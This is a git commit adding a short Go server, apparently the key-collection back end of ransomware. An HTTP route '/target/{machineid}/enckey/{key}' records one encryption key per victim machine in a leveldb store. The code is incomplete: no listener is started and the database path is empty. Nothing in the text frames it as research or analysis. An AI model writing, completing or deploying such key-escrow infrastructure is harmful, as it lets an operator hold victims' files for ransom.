244ead7da73967623185032c4e8a0604188e6c05
no <no@nomail.com>
2020-05-07 01:09:25 +0900

    first commit

---
+++ server/main.go
@@ -0,0 +1,32 @@
+package main
+
+import (
+    "log"
+    "net/http"
+    "github.com/gorilla/mux"
+    "github.com/syndtr/goleveldb/leveldb"
+)
+
+const (
+    db_filepath = ""
+)
+
+func main() {
+    db, err := leveldb.OpenFile(db_filepath, nil)
+    if err != nil {
+        log.Fatalln(err)
+    }
+    defer db.Close()
+
+    r := mux.NewRouter()
+    r.HandleFunc("/target/{machineid}/enckey/{key}", func(w http.ResponseWriter, r *http.Request) {
+        params := mux.Vars(r)
+        machineid := params["machineid"]
+        key := params["key"]
+        if _, err := db.Get([]byte(machineid), nil); err != nil {
+            db.Put([]byte(machineid), []byte(key), nil)
+        } else {
+            return
+        }
+    }).Methods("GET")
+}
